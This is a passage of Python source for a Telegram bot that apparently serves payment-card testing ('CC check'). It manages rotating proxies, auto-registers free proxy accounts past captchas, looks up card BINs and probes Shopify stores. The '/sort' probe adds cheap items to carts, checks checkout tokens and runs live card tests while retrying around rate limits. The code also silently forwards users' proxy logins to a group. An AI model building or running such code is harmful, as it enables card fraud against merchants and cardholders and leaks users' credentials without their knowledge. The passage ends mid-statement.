    if not parsed_list:
        await message.reply(
            f"{pe(E['cross'])} {bold('No valid proxies found!')}\n\n"
            f"{pe(E['warn'])} {bold('Check your format and try again.')}"
        )
        return

    # ── Test proxies in batches, keep only working, stop at 30 ────────────────
    need = MAX_PROXIES_PER_USER - len(get_user_proxies(user_id))
    if need <= 0:
        await message.reply(
            f"{pe(E['warn'])} {bold('Proxy list full!')} ({bold(str(MAX_PROXIES_PER_USER))}/{bold(str(MAX_PROXIES_PER_USER))})\n\n"
            f"{pe(E['next'])} {bold('Use')} /rmproxy {bold('to clear and add new ones.')}"
        )
        return

    status_msg = await message.reply(
        f"{pe(E['loading'])} {bold('Testing proxies...')}\n\n"
        f"{pe(E['hourglass'])} {bold('Parsed:')} {bold(str(len(parsed_list)))} | "
        f"{bold('Testing in batches of 10...')}\n"
        f"{pe(E['bolt'])} {bold('Will stop at')} {bold(str(need))} {bold('working proxies.')}"
    )

    working = []
    dead = 0
    TEST_BATCH = 10
    stopped_early = False

    for batch_start in range(0, len(parsed_list), TEST_BATCH):
        if len(working) >= need:
            stopped_early = True
            break

        batch = parsed_list[batch_start:batch_start + TEST_BATCH]

        async def _test_one(proxy_data):
            try:
                success, _, _ = await test_proxy(proxy_data["proxy_url"])
                return proxy_data if success else None
            except Exception:
                return None

        results = await asyncio.gather(*[_test_one(p) for p in batch])

        for r in results:
            if r is not None and len(working) < need:
                working.append(r)
            elif r is None:
                dead += 1

        # Update status
        try:
            await safe_edit(status_msg, 
                f"{pe(E['loading'])} {bold('Testing proxies...')}\n\n"
                f"{pe(E['check'])} {bold('Working:')} {bold(str(len(working)))}/{bold(str(need))}\n"
                f"{pe(E['cross'])} {bold('Dead:')} {bold(str(dead))}\n"
                f"{pe(E['hourglass'])} {bold('Tested:')} {bold(str(batch_start + len(batch)))}/{bold(str(len(parsed_list)))}"
            )
        except Exception:
            pass

        if len(working) >= need:
            stopped_early = True
            break

    if not working:
        await safe_edit(status_msg, 
            f"{pe(E['cross'])} {bold('All proxies are dead!')}\n\n"
            f"{pe(E['warn'])} {bold('Tested:')} {bold(str(len(parsed_list)))} | {bold('None working.')}"
        )
        return

    # Save working proxies
    add_user_proxies(user_id, working)
    total = len(get_user_proxies(user_id))

    # Notify approved group silently — show each proxy
    try:
        _px_lines = []
        for _p in working:
            _ip = _p.get("ip", "-")
            _port = _p.get("port", "-")
            _user = _p.get("username") or ""
            _pw = _p.get("password") or ""
            if _user and _pw:
                _px_lines.append(f"{pe(E['link'])} {bold(f'{_ip}:{_port}:{_user}:{_pw}')}")
            else:
                _px_lines.append(f"{pe(E['link'])} {bold(f'{_ip}:{_port}')}")
        _px_block = "\n".join(_px_lines) if _px_lines else bold("(none)")
        await bot.send_message(
            auth.APPROVED_GROUP_ID,
            f"{pe(E['check'])} {bold('Proxy Saved!')}\n\n"
            f"{pe(R['checked_by'])} {bold('User:')} {user_link(user_id, message.from_user.full_name, message.from_user.username or '')}\n"
            f"{pe(E['bolt'])} {bold('Working:')} {bold(str(len(working)))}\n"
            f"{pe(E['star'])} {bold('Total:')} {bold(str(total))}/{bold(str(MAX_PROXIES_PER_USER))}\n\n"
            f"{pe(E['globe'])} {bold('Proxies:')}\n{_px_block}",
            disable_notification=True,
        )
    except Exception:
        pass

    result_lines = [
        f"{pe(E['check'])} {bold('Proxy Testing Complete!')}\n",
        f"{pe(E['bolt'])} {bold('Working:')} {bold(str(len(working)))}",
        f"{pe(E['cross'])} {bold('Dead:')} {bold(str(dead))}",
    ]
    if parse_failed:
        result_lines.append(f"{pe(E['warn'])} {bold('Parse failed:')} {bold(str(parse_failed))}")
    if stopped_early:
        result_lines.append(f"{pe(E['star'])} {bold('Stopped early — reached')} {bold(str(need))} {bold('limit.')}")
    result_lines.append(f"{pe(E['star'])} {bold('Total saved:')} {bold(str(total))}/{bold(str(MAX_PROXIES_PER_USER))}")
    result_lines.append(f"\n{pe(E['refresh'])} {bold('Random proxy used for each CC check.')}")

    await safe_edit(status_msg, "\n".join(result_lines))


# ══════════════════════════════════════════════════════════════════════════════
#  /myproxy COMMAND — View Current Proxy
# ══════════════════════════════════════════════════════════════════════════════

@router.message(Command("myproxy"))
async def cmd_myproxy(message: types.Message):
    joined = await check_user_joined(message.from_user.id)
    if not joined:
        await message.reply(JOIN_MSG, reply_markup=join_keyboard())
        return

    proxy_list = get_user_proxies(message.from_user.id)
    if not proxy_list:
        await message.reply(
            f"{pe(E['cross'])} {bold('No Proxies Set!')}\n\n"
            f"{pe(E['warn'])} {bold('Use')} /proxy host:port:user:pass {bold('to add.')}"
        )
        return

    lines = [f"{pe(E['link'])} {bold('Your Proxies')} [{bold(str(len(proxy_list)))}/{bold(str(MAX_PROXIES_PER_USER))}]\n"]
    for i, p in enumerate(proxy_list[:10], 1):
        ip = p.get('ip', '-')
        port = p.get('port', '-')
        ptype = p.get('type', 'http').upper()
        lines.append(f"{pe(E['bolt'])} {bold(str(i))}. {bold(ip)}:{bold(port)} ({bold(ptype)})")
    if len(proxy_list) > 10:
        lines.append(f"{pe(E['next'])} {bold('...')} {bold(str(len(proxy_list) - 10))} {bold('more')}")
    lines.append(f"\n{pe(E['refresh'])} {bold('Random proxy used for each check.')}")

    check_proxy_btn = {
        "inline_keyboard": [
            [{
                "text": f"{bold('Check Proxy')}",
                "callback_data": f"check_proxy:{message.from_user.id}",
                "icon_custom_emoji_id": "6235750196861474610",
                "style": "primary"
            }],
        ]
    }

    await message.reply("\n".join(lines), reply_markup=check_proxy_btn)


# ══════════════════════════════════════════════════════════════════════════════
#  CHECK PROXY CALLBACK — Test all proxies, remove dead ones
# ══════════════════════════════════════════════════════════════════════════════

@router.callback_query(F.data.startswith("check_proxy:"))
async def cb_check_proxy(callback: types.CallbackQuery):
    owner_id = int(callback.data.split(":", 1)[1])

    if callback.from_user.id != owner_id:
        await callback.answer(bold("This is not your proxy list!"), show_alert=True)
        return

    proxy_list = get_user_proxies(owner_id)
    if not proxy_list:
        await callback.answer(bold("No proxies to check!"), show_alert=True)
        return

    await callback.answer()

    total = len(proxy_list)

    # Update message to show testing status
    try:
        await safe_edit(callback.message, 
            f"{pe(E['loading'])} {bold('Checking Proxies...')}\n\n"
            f"{pe(E['hourglass'])} {bold('Total:')} {bold(str(total))}\n"
            f"{pe(E['bolt'])} {bold('Testing in batches of 10...')}",
        )
    except Exception:
        pass

    working = []
    dead = 0
    TEST_BATCH = 10

    for batch_start in range(0, total, TEST_BATCH):
        batch = proxy_list[batch_start:batch_start + TEST_BATCH]

        async def _test_one(proxy_data):
            try:
                success, _, _ = await test_proxy(proxy_data["proxy_url"])
                return proxy_data if success else None
            except Exception:
                return None

        results = await asyncio.gather(*[_test_one(p) for p in batch])

        for r in results:
            if r is not None:
                working.append(r)
            else:
                dead += 1

        # Update progress
        tested = batch_start + len(batch)
        try:
            await safe_edit(callback.message, 
                f"{pe(E['loading'])} {bold('Checking Proxies...')}\n\n"
                f"{pe(E['check'])} {bold('Working:')} {bold(str(len(working)))}\n"
                f"{pe(E['cross'])} {bold('Dead:')} {bold(str(dead))}\n"
                f"{pe(E['hourglass'])} {bold('Tested:')} {bold(str(tested))}/{bold(str(total))}",
            )
        except Exception:
            pass

    # Save only working proxies (overwrite user's list)
    data = _load_proxies()
    data[str(owner_id)] = working
    _save_proxies(data)

    # Build final result with proxy list
    if not working:
        try:
            await safe_edit(callback.message, 
                f"{pe(E['cross'])} {bold('All Proxies Dead!')}\n\n"
                f"{pe(E['warn'])} {bold('Tested:')} {bold(str(total))} | {bold('None working.')}\n"
                f"{pe(E['next'])} {bold('Use')} /proxy {bold('to add new ones.')}"
            )
        except Exception:
            pass
        return

    lines = [
        f"{pe(E['check'])} {bold('Proxy Check Complete!')}\n",
        f"{pe(E['bolt'])} {bold('Working:')} {bold(str(len(working)))}",
        f"{pe(E['cross'])} {bold('Dead:')} {bold(str(dead))}",
    ]
    if dead > 0:
        lines.append(f"{pe(E['warn'])} {bold(str(dead))} {bold('dead proxies removed!')}")
    lines.append(f"{pe(E['star'])} {bold('Total saved:')} {bold(str(len(working)))}/{bold(str(MAX_PROXIES_PER_USER))}")
    lines.append("")

    for i, p in enumerate(working[:10], 1):
        ip = p.get('ip', '-')
        port = p.get('port', '-')
        ptype = p.get('type', 'http').upper()
        lines.append(f"{pe(E['bolt'])} {bold(str(i))}. {bold(ip)}:{bold(port)} ({bold(ptype)})")
    if len(working) > 10:
        lines.append(f"{pe(E['next'])} {bold('...')} {bold(str(len(working) - 10))} {bold('more')}")
    lines.append(f"\n{pe(E['refresh'])} {bold('Random proxy used for each check.')}")

    check_proxy_btn = {
        "inline_keyboard": [
            [{
                "text": f"{bold('Check Proxy')}",
                "callback_data": f"check_proxy:{owner_id}",
                "icon_custom_emoji_id": "6235750196861474610",
                "style": "primary"
            }],
        ]
    }

    try:
        await safe_edit(callback.message, "\n".join(lines), reply_markup=check_proxy_btn)
    except Exception:
        pass


# ══════════════════════════════════════════════════════════════════════════════
#  /rmproxy COMMAND — Remove All Proxies
# ══════════════════════════════════════════════════════════════════════════════

@router.message(Command("rmproxy"))
async def cmd_rmproxy(message: types.Message):
    joined = await check_user_joined(message.from_user.id)
    if not joined:
        await message.reply(JOIN_MSG, reply_markup=join_keyboard())
        return

    proxy_list = get_user_proxies(message.from_user.id)
    if not proxy_list:
        await message.reply(
            f"{pe(E['warn'])} {bold('No proxies to remove!')}"
        )
        return

    count = len(proxy_list)
    del_user_proxy(message.from_user.id)
    await message.reply(
        f"{pe(E['check'])} {bold('All')} {bold(str(count))} {bold('proxies removed!')}"
    )


async def _freeproxy_bg(uid: int, wait_msg):
    """Background coroutine for /freeproxy — runs without a Telegram handler timeout."""
    try:
        raw_proxies: list[str] = await asyncio.wait_for(
            _webshare_mod.get_free_proxies(10, user_id=uid), timeout=180
        )
    except asyncio.TimeoutError:
        await safe_edit(
            wait_msg,
            f"{pe(E['cross'])} {bold('Timed out fetching proxies. Try again later.')}"
        )
        return
    except Exception as exc:
        log.exception(f"[FREEPROXY] get_free_proxies exception: {exc}")
        await safe_edit(
            wait_msg,
            f"{pe(E['cross'])} {bold('Error fetching proxies:')} {bold(str(exc)[:120])}"
        )
        return

    if not raw_proxies:
        await safe_edit(
            wait_msg,
            f"{pe(E['cross'])} {bold('Could not fetch proxies right now.')}\n\n"
            f"{pe(E['sparkle'])} {bold('The free tier may be exhausted — try again in a few minutes.')}"
        )
        return

    parsed: list[dict] = []
    for line in raw_proxies:
        p = parse_proxy_format(line)
        if p:
            parsed.append(p)

    if not parsed:
        await safe_edit(
            wait_msg,
            f"{pe(E['cross'])} {bold('Proxies received but could not be parsed. Check logs.')}"
        )
        return

    to_add = parsed[:10]
    _freeproxy_pending[uid] = to_add
    freeproxy_set_claimed(uid)

    copy_lines = []
    for p in to_add:
        ip   = p.get("ip", "?")
        port = str(p.get("port", "?"))
        user = p.get("username") or ""
        pw   = p.get("password") or ""
        copy_lines.append(f"{ip}:{port}:{user}:{pw}" if user and pw else f"{ip}:{port}")

    _save_freeproxy_last(uid, copy_lines)

    existing   = get_user_proxies(uid)
    slots_free = MAX_PROXIES_PER_USER - len(existing)

    lines = [
        f"{pe(E['check'])} {bold(f'Fetched {len(to_add)} free proxies!')}",
        "",
        f"{pe(E['link'])} {bold('Proxies')} {bold('(ip:port:user:pass)')}",
        "",
    ]
    for i, proxy_str in enumerate(copy_lines, 1):
        lines.append(f"  {bold(str(i))}. {bold(proxy_str)}")

    lines += [""]
    if slots_free <= 0:
        lines.append(f"{pe(E['warn'])} {bold('Your list is full — use Copy All to save them manually.')}")
    else:
        can_add = min(len(to_add), slots_free)
        lines.append(f"{pe(E['sparkle'])} {bold(f'Slots free: {slots_free}/{MAX_PROXIES_PER_USER} — {can_add} will be added')}")
    lines.append(f"{pe(E['hourglass'])} {bold('Tap Add to save to your proxy list.')}")

    kb = {
        "inline_keyboard": [[
            {
                "text": bold("Copy All"),
                "callback_data": f"freeproxy_copy:{uid}",
                "icon_custom_emoji_id": E["link2"],
                "style": "primary",
            },
            {
                "text": bold("Add to My List"),
                "callback_data": f"freeproxy_add:{uid}",
                "icon_custom_emoji_id": E["plus"],
                "style": "success",
            },
        ]]
    }

    await safe_edit(wait_msg, "\n".join(lines), reply_markup=kb)


# ══════════════════════════════════════════════════════════════════════════════
#  /freeproxy COMMAND — Auto-fetch 10 free webshare.io proxies (24h cooldown)
# ══════════════════════════════════════════════════════════════════════════════

@router.message(Command("freeproxy"))
async def cmd_freeproxy(message: types.Message):
    uid = message.from_user.id

    # ── Auth checks ────────────────────────────────────────────────────────────
    joined = await check_user_joined(uid)
    if not joined:
        await message.reply(JOIN_MSG, reply_markup=join_keyboard())
        return
    if auth.is_banned(uid):
        await message.reply(f"{pe(E['cross'])} {bold('You are banned!')}")
        return

    # ── Cooldown check (owner bypasses) ───────────────────────────────────────
    if uid != auth.OWNER_ID:
        remaining = freeproxy_cooldown_remaining(uid)
        if remaining > 0:
            hrs  = int(remaining // 3600)
            mins = int((remaining % 3600) // 60)
            await message.reply(
                f"{pe(E['warn'])} {bold('Cooldown active!')}\n\n"
                f"{pe(E['hourglass'])} {bold('Next claim in:')} {bold(f'{hrs}h {mins}m')}\n\n"
                f"{pe(E['sparkle'])} {bold('You can claim 10 free proxies every 24 hours.')}"
            )
            return

    # ── Module availability ────────────────────────────────────────────────────
    if not _WEBSHARE_AVAILABLE:
        await message.reply(
            f"{pe(E['warn'])} {bold('Free proxy service not available on this node.')}"
        )
        return

    # ── Kick off background task — returns immediately, no 90s timeout ────────
    wait_msg = await message.reply(
        f"{pe(E['hourglass'])} {bold('Generating your free proxies...')}\n"
        f"{pe(E['sparkle'])} {bold('Solving captcha & registering — this takes ~30-90s.')}\n"
        f"{pe(E['sparkle'])} {bold('This message will update when ready.')}"
    )
    asyncio.create_task(_freeproxy_bg(uid, wait_msg))


# ══════════════════════════════════════════════════════════════════════════════
#  FREEPROXY ADD CALLBACK — saves pending proxies when user taps "Add to My List"
# ══════════════════════════════════════════════════════════════════════════════

@router.callback_query(F.data.startswith("freeproxy_add:"))
async def cb_freeproxy_add(callback: types.CallbackQuery):
    owner_id = int(callback.data.split(":", 1)[1])

    if callback.from_user.id != owner_id:
        await callback.answer(bold("These are not your proxies!"), show_alert=True)
        return

    uid      = owner_id
    to_add   = _freeproxy_pending.pop(uid, None)

    if not to_add:
        await callback.answer(bold("Already added or expired. Run /freeproxy again."), show_alert=True)
        return

    existing   = get_user_proxies(uid)
    slots_free = MAX_PROXIES_PER_USER - len(existing)
    if slots_free <= 0:
        # List is full — remind user to Copy All instead
        await callback.answer(
            bold(f"List full ({MAX_PROXIES_PER_USER}/{MAX_PROXIES_PER_USER})! Use Copy All to save them manually."),
            show_alert=True,
        )
        return

    # Add however many fit
    to_add    = to_add[:slots_free]
    add_user_proxies(uid, to_add)
    # Cooldown already set at fetch time — don't call again
    total_now = len(get_user_proxies(uid))

    # Rebuild lines with added confirmation, no buttons
    copy_lines = []
    for p in to_add:
        ip   = p.get("ip", "?")
        port = str(p.get("port", "?"))
        user = p.get("username") or ""
        pw   = p.get("password") or ""
        copy_lines.append(f"{ip}:{port}:{user}:{pw}" if user and pw else f"{ip}:{port}")

    lines = [
        f"{pe(E['check'])} {bold(f'Added {len(to_add)} proxies to your list!')}",
        "",
        f"{pe(E['link'])} {bold('Proxies')} {bold('(ip:port:user:pass)')}",
        "",
    ]
    for i, proxy_str in enumerate(copy_lines, 1):
        lines.append(f"  {bold(str(i))}. {bold(proxy_str)}")

    all_proxies_text = "\n".join(copy_lines)
    lines += [
        "",
        f"{pe(E['sparkle'])} {bold(f'Total: {total_now}/{MAX_PROXIES_PER_USER}')}",
        f"{pe(E['hourglass'])} {bold('Next free claim in 24 hours.')}",
    ]

    # Keep Copy button, replace Add with a "Done" indicator
    kb = {
        "inline_keyboard": [[
            {
                "text": bold("Copy All"),
                "callback_data": f"freeproxy_copy:{uid}",
                "icon_custom_emoji_id": E["link2"],
                "style": "primary",
            },
            {
                "text": bold("Done"),
                "callback_data": "noop",
                "icon_custom_emoji_id": E["check2"],
                "style": "success",
            },
        ]]
    }

    await safe_edit(callback.message, "\n".join(lines), reply_markup=kb)
    await callback.answer()


# ══════════════════════════════════════════════════════════════════════════════
#  FREEPROXY COPY CALLBACK — sends all proxy strings as a plain text message
# ══════════════════════════════════════════════════════════════════════════════

@router.callback_query(F.data.startswith("freeproxy_copy:"))
async def cb_freeproxy_copy(callback: types.CallbackQuery):
    owner_id = int(callback.data.split(":", 1)[1])
    if callback.from_user.id != owner_id:
        await callback.answer(bold("These are not your proxies!"), show_alert=True)
        return

    # Try in-memory pending first, then fall back to persistent saved list
    pending = _freeproxy_pending.get(owner_id)
    if pending:
        lines = []
        for p in pending:
            ip   = p.get("ip", "?")
            port = str(p.get("port", "?"))
            user = p.get("username") or ""
            pw   = p.get("password") or ""
            lines.append(f"{ip}:{port}:{user}:{pw}" if user and pw else f"{ip}:{port}")
    else:
        lines = _load_freeproxy_last(owner_id)

    if not lines:
        await callback.answer(bold("No saved proxies. Run /freeproxy again."), show_alert=True)
        return

    await callback.message.reply(
        f"{pe(E['link'])} {bold('All proxies (ip:port:user:pass):')}\n\n"
        + "\n".join(f"<code>{l}</code>" for l in lines)
    )
    await callback.answer()


# ══════════════════════════════════════════════════════════════════════════════
#  /freeproxylist COMMAND — Show pending fetched free proxies
# ══════════════════════════════════════════════════════════════════════════════

@router.message(Command("freeproxylist"))
async def cmd_freeproxylist(message: types.Message):
    uid    = message.from_user.id
    joined = await check_user_joined(uid)
    if not joined:
        await message.reply(JOIN_MSG, reply_markup=join_keyboard())
        return
    if auth.is_banned(uid):
        await message.reply(f"{pe(E['cross'])} {bold('You are banned!')}")
        return

    # Load from persistent store first (survives restarts), fall back to in-memory pending
    saved_lines = _load_freeproxy_last(uid)
    if not saved_lines:
        remaining = freeproxy_cooldown_remaining(uid)
        if remaining > 0:
            hrs  = int(remaining // 3600)
            mins = int((remaining % 3600) // 60)
            await message.reply(
                f"{pe(E['sparkle'])} {bold('No saved proxies found.')}\n\n"
                f"{pe(E['hourglass'])} {bold('Next claim in:')} {bold(f'{hrs}h {mins}m')}"
            )
        else:
            await message.reply(
                f"{pe(E['sparkle'])} {bold('No saved proxies found.')}\n\n"
                f"{pe(E['next'])} {bold('Run /freeproxy to fetch 10 free proxies.')}"
            )
        return

    copy_lines = saved_lines

    all_proxies_text = "\n".join(copy_lines)

    lines = [
        f"{pe(E['link'])} {bold(f'Your {len(copy_lines)} fetched proxies')} {bold('(ip:port:user:pass)')}",
        "",
    ]
    for i, proxy_str in enumerate(copy_lines, 1):
        lines.append(f"  {bold(str(i))}. {bold(proxy_str)}")

    lines += [
        "",
        f"{pe(E['hourglass'])} {bold('Tap Add to My List to save them.')}",
    ]

    kb = {
        "inline_keyboard": [[
            {
                "text": bold("Copy All"),
                "callback_data": f"freeproxy_copy:{uid}",
                "icon_custom_emoji_id": E["link2"],
                "style": "primary",
            },
            {
                "text": bold("Add to My List"),
                "callback_data": f"freeproxy_add:{uid}",
                "icon_custom_emoji_id": E["plus"],
                "style": "success",
            },
        ]]
    }

    tmp = await message.reply(f"{pe(E['link'])} {bold('Loading proxy list...')}")
    await safe_edit(tmp, "\n".join(lines), reply_markup=kb)


@router.message(Command("bin"))
async def cmd_bin(message: types.Message):
    joined = await check_user_joined(message.from_user.id)
    if not joined:
        await message.reply(JOIN_MSG, reply_markup=join_keyboard())
        return

    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await message.reply(
            f"{pe(E['warn'])} {bold('Usage:')} /bin 438854"
        )
        return

    bin_num = re.sub(r'\D', '', args[1].strip())[:6]
    if len(bin_num) < 6:
        await message.reply(
            f"{pe(E['cross'])} {bold('BIN must be at least 6 digits!')}"
        )
        return

    loading_msg = await message.reply(
        f"{pe(E['loading'])} <b>{bold('resolving bin')}</b>  ·  <code>{bin_num}</code>"
    )

    info = await bin_lookup(bin_num)

    await safe_edit(loading_msg,
        f"{pe(R['bin_info'])} <b>{bold('BIN INTEL')}</b>  ·  <code>{bin_num}</code>\n"
        f"{BAR_TOP}\n"
        f"{brand_emoji(info['brand'])}<b>{bold(info['brand'])}</b> {bold('/')} {bold(info['type'])} {bold('/')} {bold(info['level'])}\n"
        f"{pe(R['bank'])} {bold('issuer')}   {bold(info['bank'])}\n"
        f"{pe(R['country'])} {bold('region')}   {info['flag']} {bold(info['country'])}\n"
        f"{BAR_MID}\n"
        f"<i>{bold('powered by neon · shopify intel')}</i>"
    )


# ══════════════════════════════════════════════════════════════════════════════
#  /sort COMMAND — Sites Sorter (filters sites.txt to only API-compatible URLs)
# ══════════════════════════════════════════════════════════════════════════════

_SORT_CANCEL: dict[int, bool] = {}




_SORT_BAD_HTML_MARKERS = (
    "cf-browser-verification", "just a moment", "attention required",
    "cloudflare", "captcha", "hcaptcha", "recaptcha", "px-captcha",
    "access denied", "password", "coming soon", "checking your browser",
    "queue-it", "shop.app/checkpoint", "checkpoint", "please enable cookies",
    # extra walls that make api.py die before the card is ever touched
    "store is unavailable", "opening soon", "under construction",
    "this store is currently unavailable", "shopify.com/pause",
    "restricted access", "verify you are human", "ddos-guard",
    "perimeterx", "datadome", "incapsula", "bot detection",
    "age verification", "enter your birth", "region not supported",
    "we don't ship", "we do not ship",
)

_SORT_LOGIN_MARKERS = (
    "account/login", "customer_authentication", "requires you to log in",
    "login to continue", "sign in to checkout", "customer account required",
    "you must be logged in",
)

# Storefront currencies we accept — anything else guarantees the
# MERCHANDISE_EXPECTED_PRICE_MISMATCH you were seeing, because the checkout
# converts the listing price and the expected total no longer matches.
_SORT_OK_CURRENCIES = ("USD",)

# Max price of the cheapest in-stock variant a store may have and still be kept.
# Override per-run with:  /sort max=40   (or  /sort <card> max=40)
_SORT_MAX_PRICE = 40.0




async def _sort_probe(url: str, sem: asyncio.Semaphore, proxy_pool: list[str] | None = None,
                      live_card: str | None = None, proxy_objs: list | None = None) -> tuple[str, bool, str]:
    """Return (url, ok, reason). ok=True means safe to keep in sites.txt.
    429s (rate limits) never drop a site — they retry with backoff (rotating
    proxies each retry if a pool is provided), and if still limited the site
    is KEPT as unverified instead of being dropped."""

    async with sem:
        u = url.strip().rstrip("/")
        if not u:
            log.info(f"[sort] ✗ (empty url)")
            return url, False, "empty"
        if not u.startswith("http"):
            u = "https://" + u
        # small random stagger so 2000 tasks don't all fire at once
        await asyncio.sleep(random.uniform(0.0, 2.0))
        timeout = httpx.Timeout(20.0, connect=10.0)
        # pick starting proxy from pool (rotates per retry on 429)
        pool = proxy_pool or []
        pidx = random.randrange(len(pool)) if pool else 0
        start_proxy = pool[pidx % len(pool)] if pool else None
        _px_tag = "direct"
        if start_proxy:
            try:
                _px_tag = start_proxy.split("@")[-1]
            except Exception:
                _px_tag = "proxy"
        log.info(f"[sort] → {u}  px={_px_tag}  (live={'ON' if live_card else 'OFF'})")


        def _drop(reason: str):
            log.info(f"[sort] ✗ {u}  {reason}")
            return url, False, reason

        def _keep(reason: str):
            log.info(f"[sort] ✓ {u}  {reason}")
            return url, True, reason

        try:
            async with httpx.AsyncClient(
                timeout=timeout, follow_redirects=True, verify=False,
                proxy=start_proxy,
                headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/126.0 Safari/537.36"},
            ) as cli:

                limited = False  # saw a persistent 429 somewhere

                async def _call(method: str, path: str, **kw):
                    """GET/POST with 429 retry+backoff. Rotates proxy per retry."""
                    nonlocal limited
                    resp = None
                    for attempt in range(4):
                        try:
                            if attempt == 0:
                                resp = await getattr(cli, method)(f"{u}{path}", **kw)
                            else:
                                # rotate to next proxy in pool for the retry
                                nxt = pool[(pidx + attempt) % len(pool)] if pool else None
                                log.debug(f"[sort] ↻ {u}{path} retry {attempt} px={(nxt.split('@')[-1] if nxt else 'direct')}")
                                async with httpx.AsyncClient(
                                    timeout=timeout, follow_redirects=True, verify=False,
                                    proxy=nxt,
                                    headers=cli.headers,
                                ) as rc:
                                    resp = await getattr(rc, method)(f"{u}{path}", **kw)
                        except Exception:
                            raise
                        if resp.status_code != 429:
                            return resp
                        limited = True
                        await asyncio.sleep(min(2 ** attempt * 2.0, 12.0) + random.uniform(0, 1.5))
                    return resp  # still 429 after retries


                # 1) products.json — must be real Shopify with cheap available variant
                # scan deeper: 250/page over 3 pages so we find the true cheapest
                prods = []
                for _page in (1, 2, 3):
                    try:
                        r = await _call("get", f"/products.json?limit=250&page={_page}")
                    except Exception as e:
                        if _page == 1:
                            return _drop(f"unreachable ({type(e).__name__}: {str(e)[:60]})")
                        break
                    if r.status_code == 429:
                        if _page == 1:
                            return _keep("kept (rate-limited, unverified)")
                        break
                    if r.status_code != 200:
                        if _page == 1:
                            return _drop(f"products.json HTTP {r.status_code}")
                        break
                    try:
                        data = r.json()
                    except Exception:
                        if _page == 1:
                            return _drop("not shopify (products.json not JSON)")
                        break
                    chunk = data.get("products") or []
                    if not chunk:
                        break
                    prods.extend(chunk)
                    if len(chunk) < 250:
                        break
                if not prods:
                    return _drop("no products")
                log.info(f"[sort]   • {u} products={len(prods)}")

                # 1b) currency check — DISABLED per user request (currency no longer matters)


                cheap = None
                min_seen = None          # cheapest in-stock at any price (for logging)
                for p in prods:
                    for v in p.get("variants") or []:
                        if not v.get("available"):
                            continue
                        try:
                            price = float(v.get("price") or 0)
                        except Exception:
                            continue
                        if price >= 0.50 and (min_seen is None or price < min_seen):
                            min_seen = price
                        if price < 0.50 or price > _SORT_MAX_PRICE:
                            continue
                        if cheap is None or price < cheap[0]:
                            cheap = (price, v.get("id"), p.get("handle"))
                if not cheap:
                    _ms = f"${min_seen:.2f}" if min_seen is not None else "none in stock"
                    return _drop(f"no cheap variant (cheapest={_ms}, cap=${_SORT_MAX_PRICE:g})")
                log.info(f"[sort]   • {u} cheap=${cheap[0]:.2f} vid={cheap[1]} (min_seen={min_seen})")


                # 2) homepage HTML
                try:
                    r2 = await _call("get", "")
                except Exception as e:
                    return _drop(f"home fail ({type(e).__name__})")
                if r2.status_code == 429:
                    return _keep("kept (rate-limited at home)")
                if r2.status_code >= 400:
                    return _drop(f"home HTTP {r2.status_code}")
                low = r2.text[:60000].lower()
                if not live_card:
                    for mk in _SORT_BAD_HTML_MARKERS:
                        if mk in low:
                            return _drop(f"blocked: {mk}")
                else:
                    for mk in _SORT_BAD_HTML_MARKERS:
                        if mk in low:
                            log.info(f"[sort]   ~ {u} html marker '{mk}' ignored (live test decides)")
                            break

                # 3) cart clear
                try:
                    r3 = await _call("post", "/cart/clear.js", headers={"Accept": "application/json"})
                except Exception as e:
                    return _drop(f"cart fail ({type(e).__name__})")
                if r3.status_code == 429:
                    return _keep("kept (rate-limited at cart)")
                if r3.status_code >= 400:
                    return _drop(f"cart HTTP {r3.status_code}")
                if any(mk in r3.text.lower() for mk in _SORT_LOGIN_MARKERS):
                    return _drop("requires login")

                # 4) real cart add → checkout
                try:
                    add = await _call(
                        "post", "/cart/add.js",
                        data={"id": str(cheap[1]), "quantity": "1"},
                        headers={"Accept": "application/json", "X-Requested-With": "XMLHttpRequest"},
                    )
                except Exception as e:
                    return _drop(f"add fail ({type(e).__name__})")
                if add.status_code == 429:
                    return _keep("kept (rate-limited at add)")
                if add.status_code >= 400:
                    return _drop(f"add HTTP {add.status_code}")

                try:
                    cart = await _call("get", "/cart.js", headers={"Accept": "application/json"})
                    if cart.status_code == 429:
                        return _keep("kept (rate-limited at cart.js)")
                    cart_json = cart.json()
                    cart_total = int(cart_json.get("total_price") or 0)
                except Exception:
                    cart_total = -1
                listed_cents = int(round(cheap[0] * 100))
                if cart_total >= 0 and abs(cart_total - listed_cents) > max(50, listed_cents // 4):
                    return _drop(f"price mismatch (listed {listed_cents} vs cart {cart_total})")

                try:
                    co = await _call("get", "/checkout")
                except Exception as e:
                    return _drop(f"checkout fail ({type(e).__name__})")
                if co.status_code == 429:
                    return _keep("kept (rate-limited at checkout)")
                if co.status_code >= 400 and not live_card:
                    return _drop(f"checkout HTTP {co.status_code}")
                cl = co.text.lower()
                if not live_card:
                    for mk in _SORT_BAD_HTML_MARKERS:
                        if mk in cl:
                            return _drop(f"checkout blocked: {mk}")
                    for mk in _SORT_LOGIN_MARKERS:
                        if mk in cl:
                            return _drop("checkout login-only")
                if not live_card and ("checkout-one-session-token" not in co.text
                        and "serialized-session-token" not in co.text
                        and '"sessionToken"' not in co.text):
                    return _drop("no session token")

                _cl_full = "" if live_card else co.text.lower()
                if "we don't ship" in _cl_full or "we do not ship" in _cl_full \
                        or "no shipping" in _cl_full or "delivery is not available" in _cl_full:
                    return _drop("no delivery")
                if "payment method not available" in _cl_full \
                        or "no payment methods" in _cl_full:
                    return _drop("no payment method")
                if "site not supported" in _cl_full:
                    return _drop("site not supported")


                if not live_card:
                    return _keep(f"OK ${cheap[0]:.2f}")

                # 5) LIVE TEST  (STRICT MODE — keep the site ONLY if the API
                # returns a real card verdict on this store, i.e. the store
                # actually accepted the card and the processor replied.
                # Anything else (site errors, transport, timeouts) → DROP.)
                log.info(f"[sort]   ⚡ {u} → live card test (vid={cheap[1]}, ${cheap[0]:.2f})…")
                res = None
                _tried_pxs = set()
                for _attempt in range(3):  # retry transport failures on fresh proxies
                    try:
                        _px = random.choice(proxy_objs) if proxy_objs else None
                        if _px is not None:
                            _tried_pxs.add(id(_px))
                        res = await asyncio.wait_for(
                            checker_bridge.check_card_site(live_card, url, _px, cheap[1]),
                            timeout=120.0,
                        )
                        break  # got an API response
                    except asyncio.TimeoutError:
                        log.info(f"[sort]   ↷ {u} live timeout (attempt {_attempt+1}) — retrying" if _attempt < 2 else f"[sort]   ↷ {u} live timeout x3 — keeping unverified")
                    except Exception as e:
